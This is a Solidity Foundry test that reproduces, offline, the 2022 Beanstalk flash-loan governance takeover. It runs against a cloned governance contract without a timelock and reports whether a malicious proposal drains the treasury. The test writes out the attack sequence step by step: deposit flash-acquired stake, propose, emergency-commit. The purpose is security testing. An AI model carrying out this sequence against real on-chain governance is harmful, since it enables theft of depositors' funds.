// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    BeanToken,
    MaliciousProposalInit,
    BeanstalkGovernanceClone
} from "../fixtures/upgrade-governance/b-incident/BeanstalkGovernanceClone.sol";

/// @title upgrade-governance tier (b): Beanstalk flash-loan governance takeover (2022-04-17).
/// @notice Minimized offline reproduction of the documented mechanism: governance that reads
///         voting weight from CURRENT deposited stake (no flash-loan resistance) and executes
///         proposals IMMEDIATELY (no timelock) by delegatecall. The attacker reaches the
///         supermajority in the same transaction (flash-acquired stake), then emergencyCommits
///         a malicious proposal that runs in the protocol's context and sweeps its assets.
///         Verdict is derived from the real outcome: the protocol's treasury is drained to
///         the attacker. See PROVENANCE.md.
contract BeanstalkIncidentTest is Test {
    // Representative, scaled stake split: honest depositors vs the flash-acquired majority.
    uint256 constant HONEST_STAKE = 10_000_000e18; // other depositors' silo stake (stays locked)
    uint256 constant TREASURY = 77_000_000e18; // protocol-held assets to be drained
    uint256 constant FLASH_STAKE = 30_000_000e18; // stake the attacker acquires in-tx (flash loan)

    address constant HONEST = address(0x3000);
    address constant ATTACKER = address(0xBAD33);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[upgrade-governance] target=", target, " verdict=", verdict));
    }

    function test_beanstalk_flashMajority_delegatecallProposal_drains() public {
        BeanToken bean = new BeanToken();
        BeanstalkGovernanceClone gov = new BeanstalkGovernanceClone(bean);
        MaliciousProposalInit evilProposal = new MaliciousProposalInit();

        // Honest depositors stake into the silo; the protocol also custodies a treasury.
        bean.mint(HONEST, HONEST_STAKE);
        vm.startPrank(HONEST);
        bean.approve(address(gov), type(uint256).max);
        gov.deposit(HONEST_STAKE);
        vm.stopPrank();
        bean.mint(address(gov), TREASURY); // protocol-held assets (not deposited stake)

        uint256 govAssetsBefore = bean.balanceOf(address(gov));
        assertEq(govAssetsBefore, HONEST_STAKE + TREASURY, "governance custodies stake + treasury");

        // ATTACK (single tx in the real incident): acquire a flash-loaned majority stake,
        // deposit it, submit the malicious proposal, and emergency-commit it immediately.
        bean.mint(ATTACKER, FLASH_STAKE); // stands in for the flash-borrowed-then-deposited stake
        vm.startPrank(ATTACKER);
        bean.approve(address(gov), type(uint256).max);
        gov.deposit(FLASH_STAKE);
        uint256 id = gov.propose(address(evilProposal));
        gov.emergencyCommit(id);
        vm.stopPrank();

        // The proposal ran in governance's context and swept its entire token balance.
        bool drained = (bean.balanceOf(address(gov)) == 0 && bean.balanceOf(ATTACKER) >= TREASURY);
        _report("beanstalk-governance-victim", drained);

        assertTrue(drained, "instant flash-majority commit should drain the protocol");
        assertEq(bean.balanceOf(address(gov)), 0, "governance fully drained");
    }
}
